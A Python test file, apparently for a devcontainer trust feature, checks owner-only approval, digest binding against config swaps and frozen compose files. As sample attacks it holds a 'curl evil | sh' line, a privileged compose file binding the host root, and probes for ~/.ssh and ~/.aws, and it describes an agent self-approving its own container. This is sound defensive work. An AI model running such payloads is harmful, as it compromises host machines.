        (project / ".devcontainer" / "devcontainer.json").write_bytes(_SAMPLE_CONFIG.encode())

        mgr = devc.DevcontainerManager()
        key = os.path.realpath(str(project))
        mgr._infos[key] = _info(project_dir=key)

        monkeypatch.setattr(devc, "docker_available", lambda: False)

        def no_subprocess(*_a: object, **_k: object) -> None:
            raise AssertionError("status() must not spawn docker when it is absent")

        monkeypatch.setattr(asyncio, "create_subprocess_exec", no_subprocess)

        out = await mgr.status(project)

        assert out["has_config"] is True
        assert out["running"] is False
        assert out["container_id"] is None


class TestIdLabel:
    def test_id_label_is_stable_and_per_project(self) -> None:
        a = devc.DevcontainerManager._id_label("/host/a")
        assert a == devc.DevcontainerManager._id_label("/host/a")
        assert a != devc.DevcontainerManager._id_label("/host/b")
        key, _, digest = a.partition("=")
        assert key == "kirocrew.devcontainer"
        assert len(digest) == 24


class TestGetManager:
    def test_get_manager_is_a_singleton(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(devc, "_manager", None)
        first = devc.get_manager()
        assert devc.get_manager() is first


# ---------------------------------------------------------------------------
# Handler: project-path admission
# ---------------------------------------------------------------------------


def _request(*projects: str) -> SimpleNamespace:
    """Minimal request whose app state exposes chat slots with projects.

    The attribute is ``_slots``, which is where DashboardState actually keeps
    them — there is no ``chat_slots`` attribute and no ``__getattr__``, so a
    stub spelled that way makes ``_slot_project_roots`` return an empty set and
    every admission check fail closed. That shape passed the reject-side tests
    vacuously (a 400 for the wrong reason) while the accept-side tests failed,
    so the name is pinned against the real object in
    ``TestSlotProjectRoots.test_reads_slots_off_a_real_dashboard_state``.
    """
    slots = {f"s{i}": SimpleNamespace(project=p) for i, p in enumerate(projects)}
    return SimpleNamespace(app={"state": SimpleNamespace(_slots=slots)})


class TestResolveProject:
    @pytest.mark.asyncio
    async def test_accepts_a_live_slot_project(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        got = await devc_handlers._resolve_project(_request(str(project)), str(project))
        assert got == os.path.realpath(str(project))

    @pytest.mark.asyncio
    async def test_accepts_a_realpath_match_through_a_symlink(
        self, tmp_path: Path, symlinks_supported: None
    ) -> None:
        """Callers may hand over any spelling; admission is by realpath."""
        real = tmp_path / "real"
        real.mkdir()
        link = tmp_path / "link"
        link.symlink_to(real, target_is_directory=True)

        got = await devc_handlers._resolve_project(_request(str(real)), str(link))
        assert got == os.path.realpath(str(real))

    @pytest.mark.asyncio
    async def test_accepts_a_non_normalized_spelling(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        spelled = str(tmp_path / "proj" / "." / ".." / "proj")
        got = await devc_handlers._resolve_project(_request(str(project)), spelled)
        assert got == os.path.realpath(str(project))

    @pytest.mark.asyncio
    async def test_rejects_a_path_no_slot_is_scoped_to(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        other = tmp_path / "other"
        other.mkdir()
        assert await devc_handlers._resolve_project(_request(str(project)), str(other)) is None

    @pytest.mark.asyncio
    async def test_rejects_a_subdirectory_of_a_slot_project(self, tmp_path: Path) -> None:
        """Admission is exact-match, not prefix-match."""
        project = tmp_path / "proj"
        (project / "sub").mkdir(parents=True)
        assert (
            await devc_handlers._resolve_project(_request(str(project)), str(project / "sub"))
            is None
        )

    @pytest.mark.asyncio
    async def test_rejects_arbitrary_host_paths(self, tmp_path: Path) -> None:
        """Slot-project matching is the only admission rule, so credential and
        system directories are refused for the same reason /nowhere is: no
        session is scoped to them, so trusting or probing them is meaningless."""
        project = tmp_path / "proj"
        project.mkdir()
        for probe in ("~/.ssh", "/etc", str(Path.home() / ".aws"), "/nonexistent/x"):
            assert await devc_handlers._resolve_project(_request(str(project)), probe) is None

    @pytest.mark.asyncio
    async def test_rejects_blank_and_non_string_input(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        req = _request(str(project))
        for raw in (None, "", "   ", 17, ["/tmp"], {}):
            assert await devc_handlers._resolve_project(req, raw) is None

    @pytest.mark.asyncio
    async def test_rejects_everything_when_no_slots_exist(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        empty = SimpleNamespace(app={"state": SimpleNamespace(_slots={})})
        assert await devc_handlers._resolve_project(empty, str(project)) is None

    @pytest.mark.asyncio
    async def test_missing_state_is_not_a_crash(self, tmp_path: Path) -> None:
        stateless = SimpleNamespace(app={})
        assert await devc_handlers._resolve_project(stateless, str(tmp_path)) is None

    @pytest.mark.asyncio
    async def test_surrounding_whitespace_is_stripped(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        got = await devc_handlers._resolve_project(_request(str(project)), f"  {project}  ")
        assert got == os.path.realpath(str(project))


class TestSlotProjectRoots:
    """Slot admission reads loop-owned state, then resolves paths off the loop.

    The two halves are separate on purpose: the loop creates and deletes slots, so
    the dict is read where its owner runs, and only ``realpath`` -- which can block
    on a network-backed home -- goes to a worker thread.
    """

    @staticmethod
    def _roots(state: object) -> set[str]:
        """Both halves, as the handler runs them."""
        return devc_handlers._realpath_set(devc_handlers._slot_project_strings(state))

    def test_skips_slots_without_a_usable_project(self, tmp_path: Path) -> None:
        state = SimpleNamespace(
            _slots={
                "a": SimpleNamespace(project=str(tmp_path)),
                "b": SimpleNamespace(project=None),
                "c": SimpleNamespace(project=""),
                "d": SimpleNamespace(project=123),
                "e": SimpleNamespace(),
            }
        )
        assert self._roots(state) == {os.path.realpath(str(tmp_path))}

    def test_empty_for_a_stateless_app(self) -> None:
        assert self._roots(None) == set()
        assert self._roots(SimpleNamespace(_slots=None)) == set()

    def test_the_loop_half_does_no_filesystem_work(self, tmp_path: Path) -> None:
        """The whole point of the split. If the loop half still resolved paths, the
        blocking call would be back on the event loop and the split would be
        decoration -- so the test fails if it touches realpath at all.
        """
        state = SimpleNamespace(_slots={"a": SimpleNamespace(project=f" {tmp_path} ")})

        def explode(*_a: object, **_k: object) -> str:
            raise AssertionError("the event-loop half must not call realpath")

        with patch.object(devc_handlers.os.path, "realpath", explode):
            out = devc_handlers._slot_project_strings(state)
        # Strings only, whitespace-stripped, unresolved.
        assert out == [str(tmp_path)]

    def test_reads_slots_off_a_real_dashboard_state(self, tmp_path: Path) -> None:
        """Asserted against the REAL DashboardState, not a hand-built stub.

        Every other test here uses a SimpleNamespace, which cannot catch the
        actual defect this pins: naming an attribute DashboardState does not
        have (``chat_slots``) yields {} silently, because the class has
        ``__slots__``-style fixed attributes and no ``__getattr__``, so
        ``getattr(state, wrong_name, None) or {}`` fails closed and every
        endpoint 400s even for a live slot's own project. Only a real instance
        makes a rename of ``_slots`` fail this test instead of passing it.

        REVERT-VERIFIED: putting ``chat_slots`` back in the handler failed 17
        tests across ``TestResolveProject``, ``TestSlotProjectRoots`` and
        ``TestTrustHandlerDigestBinding``; handler md5 unchanged after
        restoring. That count is the point — under the old stub shape those
        reject-side tests passed vacuously.
        """
        from chat_test_helpers import _make_state

        state = _make_state(tmp_path)
        project = tmp_path / "proj"
        project.mkdir()
        state.get_or_create_slot("chat-1").project = str(project)
        state.get_or_create_slot("chat-2").project = ""

        assert self._roots(state) == {os.path.realpath(str(project))}


# ---------------------------------------------------------------------------
# Handler: POST /api/devcontainer/trust — the reviewed digest is REQUIRED
# ---------------------------------------------------------------------------


class _SelRecorder:
    """Captures ``log_api_access`` calls instead of writing the real audit log."""

    def __init__(self) -> None:
        self.calls: list[dict] = []

    def log_api_access(self, **kw: object) -> None:
        self.calls.append(kw)


def _trust_request(payload: object, *projects: str) -> SimpleNamespace:
    """A dashboard-OWNER request for the trust endpoint.

    Extends ``_request`` (slot-project admission) with the attributes the
    handler itself reads: ``get`` for the auth claims, ``json`` for the body,
    and ``app`` for the slot state.

    Deliberately does NOT set ``internal_auth``. That claim is the one
    ``deny_non_dashboard_caller`` accepts without an owner lookup, and it is the
    path every MCP call arrives on, so authenticating these tests with it would
    exercise the agent's self-approval route rather than the human's -- and
    would keep passing if the owner check were removed entirely. Callers must
    pair this with the ``as_owner`` fixture, which supplies the owner predicate.
    """
    base = _request(*projects)

    async def _json() -> object:
        return payload

    def _get(key: str, default: object = None) -> object:
        return default

    return SimpleNamespace(app=base.app, get=_get, json=_json)


def _internal_request(payload: object, *projects: str) -> SimpleNamespace:
    """A loopback request carrying ``internal_auth`` -- i.e. an agent MCP call."""
    req = _trust_request(payload, *projects)

    def _get(key: str, default: object = None) -> object:
        return True if key == "internal_auth" else default

    return SimpleNamespace(app=req.app, get=_get, json=req.json)


@pytest.fixture
def as_owner(monkeypatch: pytest.MonkeyPatch) -> None:
    """Make the owner predicate accept, without granting ``internal_auth``.

    ``deny_non_dashboard_caller`` imports this symbol inside the function body
    to avoid an import cycle, so it must be patched on the defining module.
    """
    import kiro_crew.dashboard.handlers.source_providers as sp

    monkeypatch.setattr(sp, "is_owner_dashboard_request", lambda request: True)


def _body(resp) -> dict:  # type: ignore[no-untyped-def]
    return json.loads(resp.body)


@pytest.fixture
def sel_recorder(monkeypatch: pytest.MonkeyPatch) -> _SelRecorder:
    rec = _SelRecorder()
    monkeypatch.setattr(devc_handlers, "sel", lambda: rec)
    return rec


class TestTrustHandlerDigestBinding:
    """The endpoint must refuse to grant against unreviewed bytes.

    ``grant_trust``'s own guard only fires when a digest is PASSED, so the
    endpoint requiring one is the other half of the fix: an omitted field would
    otherwise fall back to the unbound form and re-open the preview→grant
    window from the network side.
    """

    @pytest.mark.asyncio
    @pytest.mark.parametrize("digest", [None, "", "   ", 17, ["abc"], {"d": "abc"}, True])
    async def test_missing_or_non_string_digest_is_rejected_with_no_grant(
        self,
        as_owner: None,
        tmp_path: Path,
        trust_home: Path,
        sel_recorder: _SelRecorder,
        digest: object,
    ) -> None:
        """REVERT-VERIFIED against the ``digest_required`` screen in
        ``api_devcontainer_trust``: without it a body carrying no digest grants
        against whatever is on disk, so the status flips to 200 and the trust
        store gains an entry."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        body: dict = {"project": str(project)}
        if digest is not None:
            body["digest"] = digest

        resp = await devc_handlers.api_devcontainer_trust(_trust_request(body, str(project)))

        assert resp.status == 400
        assert _body(resp)["code"] == "digest_required"
        assert devc.is_trusted(project) is False
        assert not (trust_home / "devcontainers" / "trust.json").exists()

    @pytest.mark.asyncio
    async def test_stale_digest_is_409_with_a_denied_audit_event(
        self, as_owner: None, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        reviewed = devc.config_digest(cfg)
        cfg.write_bytes(json.dumps({"name": "kirocrew-dev", "image": "evil:latest"}).encode())

        resp = await devc_handlers.api_devcontainer_trust(
            _trust_request({"project": str(project), "digest": reviewed}, str(project))
        )

        assert resp.status == 409
        assert _body(resp)["code"] == "devcontainer_config_changed"
        assert devc.is_trusted(project) is False
        assert not (trust_home / "devcontainers" / "trust.json").exists()
        denied = [c for c in sel_recorder.calls if c.get("outcome") == "denied"]
        assert len(denied) == 1
        assert denied[0]["operation"] == "devcontainer_trust.grant"

    @pytest.mark.asyncio
    async def test_matching_digest_grants_and_audits_success(
        self, as_owner: None, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        reviewed = devc.config_digest(cfg)

        resp = await devc_handlers.api_devcontainer_trust(
            _trust_request({"project": str(project), "digest": reviewed}, str(project))
        )

        assert resp.status == 200
        assert _body(resp) == {"trusted": True, "digest": reviewed}
        assert devc.is_trusted(project) is True
        store = json.loads(
            (trust_home / "devcontainers" / "trust.json").read_text(encoding="utf-8")
        )
        assert store[os.path.realpath(str(project))]["digest"] == reviewed
        assert [c["outcome"] for c in sel_recorder.calls] == ["success"]

    @pytest.mark.asyncio
    async def test_surrounding_whitespace_in_the_digest_is_stripped(
        self, as_owner: None, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        reviewed = devc.config_digest(cfg)

        resp = await devc_handlers.api_devcontainer_trust(
            _trust_request({"project": str(project), "digest": f"  {reviewed}\n"}, str(project))
        )
        assert resp.status == 200
        assert devc.is_trusted(project) is True

    @pytest.mark.asyncio
    async def test_project_admission_runs_before_the_digest_screen(
        self, as_owner: None, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        """An unknown project is still ``unknown_project``, not
        ``digest_required`` — the weaker error must not leak path admission."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        other = tmp_path / "other"
        other.mkdir()

        resp = await devc_handlers.api_devcontainer_trust(
            _trust_request({"project": str(other)}, str(project))
        )
        assert resp.status == 400
        assert _body(resp)["code"] == "unknown_project"

    @pytest.mark.asyncio
    async def test_absent_config_still_maps_to_404(
        self, as_owner: None, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()

        resp = await devc_handlers.api_devcontainer_trust(
            _trust_request({"project": str(project), "digest": "deadbeef"}, str(project))
        )
        assert resp.status == 404
        assert _body(resp)["code"] == "no_devcontainer_config"


class TestInternalCallersCannotSelfApprove:
    """The agent must not be able to authorize its own devcontainer.

    ``deny_non_dashboard_caller`` permits a request carrying ``internal_auth``,
    because it also guards ``suggest_followup`` where the agent legitimately
    raises a card. That claim is the path every MCP call arrives on, so honoring
    it on this surface would let the agent read the digest and grant trust to a
    configuration it wrote -- self-approving the human decision the whole
    feature exists to require.

    Revert-verified: replacing ``_deny_non_owner`` with a direct call to
    ``deny_non_dashboard_caller`` fails every test in this class.
    """

    @pytest.mark.parametrize(
        "operation",
        [
            "devcontainer_status",
            "devcontainer_config",
            "devcontainer_trust",
            "devcontainer_rebuild",
        ],
    )
    def test_guard_refuses_internal_auth(self, operation: str, sel_recorder: _SelRecorder) -> None:
        resp = devc_handlers._deny_non_owner(_internal_request(None), operation)
        assert resp is not None
        assert resp.status == 403
        assert _body(resp)["code"] == "internal_caller_denied"

    def test_refusal_is_audited_as_denied(self, sel_recorder: _SelRecorder) -> None:
        devc_handlers._deny_non_owner(_internal_request(None), "devcontainer_trust")
        assert [e["outcome"] for e in sel_recorder.calls] == ["denied"]
        assert sel_recorder.calls[0]["operation"] == "devcontainer_trust"

    def test_the_owner_is_still_allowed(self, as_owner: None) -> None:
        """The guard must reject the agent WITHOUT locking out the human.

        Without this, deny-everything would pass the tests above while breaking
        the trust card entirely.
        """
        assert devc_handlers._deny_non_owner(_trust_request(None), "devcontainer_trust") is None

    @pytest.mark.asyncio
    async def test_internal_caller_cannot_grant_trust_end_to_end(
        self, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        """The full endpoint, not just the guard: no grant is recorded."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        digest = devc.config_digest(cfg)
        resp = await devc_handlers.api_devcontainer_trust(
            _internal_request({"project": str(project), "digest": digest}, str(project))
        )
        assert resp.status == 403
        assert devc.is_trusted(project) is False

    @pytest.mark.asyncio
    async def test_internal_caller_cannot_read_the_config_preview(
        self, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        resp = await devc_handlers.api_devcontainer_config(_internal_request(None, str(project)))
        assert resp.status == 403

    @pytest.mark.asyncio
    async def test_internal_caller_cannot_read_status(
        self, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        """Status reports the trust decision's outcome, so it is owner-only too."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        resp = await devc_handlers.api_devcontainer_status(_internal_request(None, str(project)))
        assert resp.status == 403


class TestDigestIsBoundToTheGrant:
    """``up()`` must build only the digest the human approved.

    Checking ``is_trusted()`` and then recomputing the digest reads the tree
    twice. A swap landing between the two reads produces an attacker digest that
    is internally SELF-CONSISTENT, so ``write_build_config``'s own re-check
    passes and unapproved configuration builds. The digest must therefore be
    compared against the recorded grant, not merely against itself.

    Revert-verified: changing ``_trusted_digest`` back to an ``is_trusted()``
    call followed by a bare ``config_digest()`` fails
    ``test_a_swap_after_the_grant_is_refused`` and
    ``test_a_self_consistent_attacker_tree_is_still_refused``.
    """

    def test_returns_the_digest_when_it_matches_the_grant(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        granted = devc.grant_trust(project, devc.config_digest(cfg))
        assert devc.DevcontainerManager._trusted_digest(str(project), cfg) == granted

    def test_untrusted_project_is_refused(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        with pytest.raises(devc.DevcontainerNotTrusted):
            devc.DevcontainerManager._trusted_digest(str(project), cfg)

    def test_a_swap_after_the_grant_is_refused(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project, devc.config_digest(cfg))
        (project / ".devcontainer" / "devcontainer.json").write_bytes(
            b'{"image": "attacker/img:latest"}'
        )
        with pytest.raises(devc.DevcontainerNotTrusted):
            devc.DevcontainerManager._trusted_digest(str(project), cfg)

    def test_a_sibling_swap_after_the_grant_is_refused(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """The json can stay byte-identical while a hashed sibling changes."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        (project / ".devcontainer" / "setup.sh").write_bytes(b"echo hi\n")
        devc.grant_trust(project, devc.config_digest(cfg))
        (project / ".devcontainer" / "setup.sh").write_bytes(b"curl evil | sh\n")
        with pytest.raises(devc.DevcontainerNotTrusted):
            devc.DevcontainerManager._trusted_digest(str(project), cfg)

    @pytest.mark.asyncio
    async def test_only_the_granted_digest_can_reach_the_build(
        self, tmp_path: Path, trust_home: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The ordering property, pinned where the bug actually lived.

        The vulnerability was not inside any single function -- it was the
        SEQUENCE: ``is_trusted()`` read the tree, then ``config_digest()`` read
        it again, and only the second result was carried forward. A swap landing
        in that gap yielded an attacker digest that was internally consistent,
        so every self-comparison downstream accepted it.

        Testing the helper in isolation cannot detect this (it performs one read
        by construction, so there is no gap to exploit). This test instead hooks
        the trust decision itself and mutates the tree the instant it returns,
        which is exactly when the swap would land. Whichever predicate the
        implementation consults, the build must still receive the digest the
        human granted -- never the one produced after the decision.

        Revert-verified: with the two-read sequence restored, the captured
        digest is the attacker's and this fails.
        """
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        granted = devc.grant_trust(project, devc.config_digest(cfg))

        def _swap() -> None:
            (project / ".devcontainer" / "devcontainer.json").write_bytes(
                b'{"image": "attacker/img:latest"}'
            )

        # Hook BOTH predicates: the grant-bound one the fixed code calls and the
        # bare one the vulnerable sequence called, so the swap lands right after
        # the trust decision either way.
        real_matches = devc._digest_matches_grant
        real_trusted = devc.is_trusted

        def matches(project_dir: object, digest: str) -> bool:
            out = real_matches(project_dir, digest)
            _swap()
            return out

        def trusted(project_dir: object) -> bool:
            out = real_trusted(project_dir)
            _swap()
            return out

        monkeypatch.setattr(devc, "_digest_matches_grant", matches)
        monkeypatch.setattr(devc, "is_trusted", trusted)

        seen: list[str] = []

        def capture(project_dir: str, digest: str) -> Path:
            seen.append(digest)
            raise devc.DevcontainerError("stop before spawning")

        monkeypatch.setattr(devc, "write_build_config", capture)

        with pytest.raises(devc.DevcontainerError):
            await devc.DevcontainerManager().up(project)

        attacker = devc.config_digest(cfg)
        assert attacker != granted, "fixture must actually diverge"
        assert seen != [attacker], "the post-decision digest reached the build"
        assert seen in ([], [granted]), seen

    def test_a_self_consistent_attacker_tree_is_still_refused(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """A swapped tree hashes cleanly yet must not be trusted.

        Asserts both halves: the attacker digest is internally valid (so
        ``write_build_config`` accepts it against ITSELF), and comparing it to
        the grant is what rejects it.
        """
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        granted = devc.grant_trust(project, devc.config_digest(cfg))
        (project / ".devcontainer" / "devcontainer.json").write_bytes(
            b'{"image": "attacker/img:latest"}'
        )
        attacker = devc.config_digest(cfg)
        assert attacker != granted
        # Self-consistent: write_build_config accepts it against ITSELF.
        devc.write_build_config(str(project), attacker)
        with pytest.raises(devc.DevcontainerNotTrusted):
            devc.DevcontainerManager._trusted_digest(str(project), cfg)


class TestDigestIsPlatformIndependent:
    """Tree relpaths hash in posix form on every host.

    ``str(Path.relative_to())`` yields ``scripts\\x.sh`` on Windows and
    ``scripts/x.sh`` elsewhere, which made the digest of byte-identical content
    differ by platform and surfaced as a Windows-only test failure. The relpath
    is also displayed in the trust prompt, where a forward slash reads correctly
    everywhere.

    Revert-verified: restoring ``str(...)`` fails
    ``test_nested_relpaths_use_forward_slashes`` on Windows. On POSIX the two
    spellings coincide, so the guard below asserts the property directly rather
    than relying on the separator differing.
    """

    def test_nested_relpaths_use_forward_slashes(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        nested = project / ".devcontainer" / "scripts"
        nested.mkdir()
        (nested / "post-create.sh").write_bytes(b"echo hi\n")
        rels = [rel for rel, _ in devc._read_config_tree(cfg)]
        assert "scripts/post-create.sh" in rels
        assert not any("\\" in rel for rel in rels)

    def test_preview_reports_posix_other_inputs(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        nested = project / ".devcontainer" / "scripts"
        nested.mkdir()
        (nested / "post-create.sh").write_bytes(b"echo hi\n")
        assert devc.config_preview(project)["other_inputs"] == ["scripts/post-create.sh"]

    def test_digest_does_not_depend_on_the_host_separator(self, tmp_path: Path) -> None:
        """The hashed relpath is the posix spelling, whatever ``os.sep`` is.

        Asserts against an independently computed expectation rather than a
        golden constant, so it pins the framing without hardcoding a hash that
        any unrelated change would churn.
        """
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        nested = project / ".devcontainer" / "scripts"
        nested.mkdir()
        (nested / "post-create.sh").write_bytes(b"echo hi\n")
        entries = devc._read_config_tree(cfg)
        expected = devc._digest_entries(
            [(rel.replace(os.sep, "/"), data) for rel, data in entries], b"tree"
        )
        assert devc.config_digest(cfg) == expected


class TestComposeFilesAreFrozen:
    """A referenced compose file must be read from frozen bytes, not the workspace.

    Compose is the one referenced build input that both (a) resolves against the
    CONFIG FILE's directory rather than the workspace, and (b) can request host
    privilege -- ``privileged``, a bind of ``/``, the docker socket. So unlike a
    Dockerfile (whose mid-build swap only changes in-container content the agent
    already controls) a compose swap during the build is a host-boundary
    escalation, and unlike a Dockerfile it CAN be relocated.

    ``write_build_config`` therefore copies the digest-verified bytes in beside
    the sanitized config and rewrites the reference to the copy, so the live file
    is never read during the build.

    Revert-verified: dropping the ``_freeze_compose_files`` call leaves the
    reference pointing at the workspace file and fails every test here that
    asserts the rewrite.
    """

    @staticmethod
    def _compose_project(tmp_path: Path, ref: object, **files: bytes) -> Path:
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        for name, data in files.items():
            (dc / name.replace("_", ".")).write_bytes(data)
        (dc / "devcontainer.json").write_bytes(
            json.dumps({"name": "x", "dockerComposeFile": ref, "service": "app"}).encode()
        )
        return project

    def test_reference_is_rewritten_to_a_local_frozen_copy(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        body = b"services:\n  app:\n    image: alpine\n"
        project = self._compose_project(tmp_path, "compose.yml", compose_yml=body)
        cfg = devc.find_devcontainer_config(project)
        out = devc.write_build_config(str(project), devc.config_digest(cfg))
        built = json.loads(out.read_text())
        ref = built["dockerComposeFile"]
        assert ref != "compose.yml", "still points at the workspace file"
        # A bare leaf name, so the CLI resolves it beside the sanitized config
        # rather than escaping back out to the live tree.
        assert "/" not in ref and "\\" not in ref
        # Not byte-equal: the frozen copy also carries the injected DoS ceilings.
        # The service the project declared must survive intact alongside them.
        frozen_doc = yaml.safe_load((out.parent / ref).read_text(encoding="utf-8"))
        assert frozen_doc["services"]["app"]["image"] == "alpine"
        assert "pids_limit" in frozen_doc["services"]["app"]

    def test_a_swap_after_freezing_does_not_change_what_the_build_reads(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """The actual vector: swap the live file mid-build, frozen bytes stand."""
        body = b"services:\n  app:\n    image: alpine\n"
        project = self._compose_project(tmp_path, "compose.yml", compose_yml=body)
        cfg = devc.find_devcontainer_config(project)
        out = devc.write_build_config(str(project), devc.config_digest(cfg))
        frozen = out.parent / json.loads(out.read_text())["dockerComposeFile"]

        (project / ".devcontainer" / "compose.yml").write_bytes(
            b"services:\n  app:\n    privileged: true\n" b"    volumes:\n      - /:/host\n"
        )
        # The frozen copy is not byte-equal to the original (it carries the
        # injected ceilings), so the invariant is asserted on CONTENT: none of
        # the swapped-in privilege escalation appears, and the approved image
        # still does.
        frozen_doc = yaml.safe_load(frozen.read_text(encoding="utf-8"))
        assert frozen_doc["services"]["app"]["image"] == "alpine"
        assert "privileged" not in frozen_doc["services"]["app"]
        assert "volumes" not in frozen_doc["services"]["app"]

    def test_list_form_freezes_every_entry_and_stays_a_list(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        a = b"services:\n  app:\n    image: alpine\n"
        b = b"services:\n  app:\n    command: sleep 1\n"
        project = self._compose_project(
            tmp_path, ["compose.yml", "extra.yml"], compose_yml=a, extra_yml=b
        )
        cfg = devc.find_devcontainer_config(project)
        out = devc.write_build_config(str(project), devc.config_digest(cfg))
        refs = json.loads(out.read_text())["dockerComposeFile"]
        assert isinstance(refs, list) and len(refs) == 2
        # Distinguished by the key each file uniquely declared, since the frozen
        # copies also carry the injected ceilings and are not byte-equal.
        docs = [yaml.safe_load((out.parent / r).read_text(encoding="utf-8")) for r in refs]
        assert {d["services"]["app"].get("image") for d in docs} == {"alpine", None}
        assert {d["services"]["app"].get("command") for d in docs} == {None, "sleep 1"}

    def test_distinct_sources_do_not_collide_on_one_copy(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """Two references must not flatten onto the same leaf and lose one."""
        a = b"services:\n  app:\n    image: alpine\n"
        b = b"services:\n  app:\n    command: sleep 1\n"
        project = self._compose_project(
            tmp_path, ["compose.yml", "extra.yml"], compose_yml=a, extra_yml=b
        )
        cfg = devc.find_devcontainer_config(project)
        out = devc.write_build_config(str(project), devc.config_digest(cfg))
        refs = json.loads(out.read_text())["dockerComposeFile"]
        assert len(set(refs)) == 2

    def test_a_dockerfile_config_is_left_alone(self, tmp_path: Path, trust_home: Path) -> None:
        """The freezer must not invent a compose key or disturb build settings."""
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "Dockerfile").write_bytes(b"FROM alpine\n")
        (dc / "devcontainer.json").write_bytes(
            json.dumps({"name": "x", "build": {"dockerfile": "Dockerfile"}}).encode()
        )
        cfg = devc.find_devcontainer_config(project)
        out = devc.write_build_config(str(project), devc.config_digest(cfg))
        built = json.loads(out.read_text())
        assert built["build"] == {"dockerfile": "Dockerfile"}
        assert "dockerComposeFile" not in built

    def test_a_reference_outside_the_hashed_tree_is_refused(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """Fails closed rather than falling back to reading the live path.

        Containment should already have rejected this, so reaching the freezer
        with an unhashed reference means a gap upstream -- which must surface as
        a refusal, not as a silent read of unverified bytes.
        """
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(b"{}")
        entries = devc._read_config_tree(devc.find_devcontainer_config(project))
        with pytest.raises(devc.DevcontainerError, match="not part of the hashed"):
            devc._freeze_compose_files(
                {"dockerComposeFile": "absent.yml"}, entries, tmp_path / "out", str(dc)
            )


class TestTrustStoreTransactions:
    """Grant and revoke must be serialized read-modify-write transactions.

    The failure mode is a lost update: a concurrent revoke of project A and
    grant of project B each write back the snapshot they read, and the later
    write resurrects A's removed entry. That direction is fail-OPEN -- a
    revoked project stays trusted -- so the lock has to span the read as well
    as the write, not just guard the write.

    Manually reproduced before fixing: 60 real concurrent grant/revoke pairs
    left the revoked project trusted in 6 rounds with the lock made a no-op,
    and 0 rounds with it in place. That reproduction is deliberately NOT a test
    here -- a thread race is probabilistic and would be flaky in CI. These
    tests pin the invariant that makes the race impossible instead: the lock is
    held across both the read and the write.

    Revert-verified: making ``_locked_trust`` yield without taking the lock
    fails the two span tests; restoring the fixed ``.tmp`` write fails the
    atomic-write test.
    """

    @staticmethod
    def _instrument(monkeypatch: pytest.MonkeyPatch) -> dict:
        """Record whether the exclusive lock was held at each store access."""
        state = {"depth": 0, "read_held": [], "write_held": []}

        real_lock = devc.platform_compat.file_lock

        @contextlib.contextmanager
        def counting_lock(fd: int, *, exclusive: bool = True):  # type: ignore[no-untyped-def]
            state["depth"] += 1
            try:
                with real_lock(fd, exclusive=exclusive):
                    yield
            finally:
                state["depth"] -= 1

        real_read, real_write = devc._read_trust, devc._write_trust

        def read() -> dict:
            state["read_held"].append(state["depth"] > 0)
            return real_read()

        def write(data: dict) -> None:
            state["write_held"].append(state["depth"] > 0)
            real_write(data)

        monkeypatch.setattr(devc.platform_compat, "file_lock", counting_lock)
        monkeypatch.setattr(devc, "_read_trust", read)
        monkeypatch.setattr(devc, "_write_trust", write)
        return state

    def test_grant_holds_the_lock_across_read_and_write(
        self, tmp_path: Path, trust_home: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
